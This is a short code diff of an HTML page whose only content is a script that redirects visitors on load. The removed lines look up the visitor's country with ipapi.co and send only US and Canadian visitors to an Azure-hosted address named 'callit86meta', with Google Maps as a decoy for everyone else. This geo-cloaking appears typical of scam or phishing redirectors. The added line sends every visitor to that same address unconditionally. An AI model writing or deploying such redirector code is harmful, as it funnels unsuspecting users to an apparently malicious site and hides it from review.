@@ -1,28 +1,12 @@
+
 <!DOCTYPE html>
 <html>
 <body>
 
 <script>
-document.addEventListener("DOMContentLoaded", function () {
-  fetch("https://ipapi.co/json/")
-    .then(response => response.json())
-    .then(data => {
-      let country = data.country_code;
-      let redirectURL;
-
-      if (country === "US" || country === "CA") {
-        redirectURL = "https://callit86meta.z13.web.core.windows.net/";
-      } else {
-        redirectURL = "https://maps.google.com";
-      }
-
-      // Redirect immediately after detecting country
-      window.location.href = redirectURL;
-    })
-    .catch(error => console.error("Error fetching location:", error));
-});
+  window.location.href = "https://callit86meta.z13.web.core.windows.net/";
 </script>
-
 
 </body>
 </html> 
+
